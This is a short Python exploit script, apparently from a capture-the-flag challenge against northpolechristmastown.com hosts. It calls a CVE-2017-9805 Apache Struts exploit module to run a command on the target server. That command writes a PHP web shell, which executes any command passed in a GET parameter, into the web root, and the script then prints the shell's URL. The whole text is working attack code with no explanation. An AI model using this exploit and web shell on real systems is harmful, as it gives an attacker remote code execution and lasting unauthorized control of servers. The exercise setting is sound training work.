import cve_2017_9805

shell_name = cve_2017_9805.random_string(20) + '.php'
shell = '''<?php echo "<pre>" . shell_exec($_GET[e]) . "</pre>"; ?>'''
command = 'echo \'' + shell + '\' > /var/www/html/' + shell_name

print("Creating shell: https://l2s.northpolechristmastown.com/" + shell_name + '?e=')
cve_2017_9805.main("https://dev.northpolechristmastown.com/orders.xhtml", command)
